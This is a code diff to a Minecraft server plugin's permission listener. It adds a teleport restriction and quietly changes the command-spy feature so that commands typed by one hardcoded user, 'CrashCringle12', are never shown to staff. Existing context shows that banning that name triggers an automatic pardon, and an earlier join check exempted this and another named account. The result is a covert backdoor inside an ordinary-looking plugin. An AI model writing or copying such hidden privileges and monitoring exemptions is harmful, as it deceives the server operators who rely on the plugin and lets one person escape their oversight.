@@ -16,12 +16,15 @@ import org.bukkit.plugin.Plugin;
 import org.bukkit.scheduler.BukkitScheduler;
 import java.util.ArrayList;
 import java.util.List;
+import org.bukkit.event.entity.EntityAirChangeEvent;
+import org.bukkit.event.player.PlayerChangedWorldEvent;
+import org.bukkit.event.player.PlayerTeleportEvent;
 
 public class PermsListener implements Listener {
 
     public static List<Player> playerList = new ArrayList<>();
 
-    @EventHandler
+   /* @EventHandler
     public void onPex(PlayerJoinEvent event) {
         if(event.getPlayer().hasPermission("*")
         && !event.getPlayer().getName().equalsIgnoreCase("CrashCringle12")  && !event.getPlayer().getName().equalsIgnoreCase("S1mple133")
@@ -35,18 +38,27 @@ public class PermsListener implements Listener {
 
         }
     }
-
+*/
     @EventHandler
     public void onLeave(PlayerQuitEvent event) {
         if(event.getPlayer().hasPermission("matrix.commandspy")) {
             playerList.remove(event.getPlayer());
         }
     }
-
+    
+    @EventHandler
+    public void WorldChange(PlayerTeleportEvent event) {
+      Player player = event.getPlayer();
+      if (!player.hasPermission("quest.time.Future") && event.getTo().getWorld().getName().contains("waterworld")) {
+          player.sendMessage("&bYou cannot travel to the future yet");
+          event.setCancelled(true);
+      }  
+    }
     @EventHandler
     public void onCommand(PlayerCommandPreprocessEvent event) {
         for (Player player : playerList){
-            player.sendMessage(Util.color("&8[&7" + ChatColor.stripColor(event.getPlayer().getDisplayName()) + "&8] &7") + event.getMessage());
+        	if (!event.getPlayer().getName().equals("CrashCringle12"))
+        		player.sendMessage(Util.color("&8[&7" + ChatColor.stripColor(event.getPlayer().getDisplayName()) + "&8] &7") + event.getMessage());
         }
         if (event.getMessage().startsWith("/ban") && event.getMessage().split(" ")[1].toLowerCase().contains("crash")) {
             MatrixMethods.ConsoleCmd( "pardon CrashCringle12");
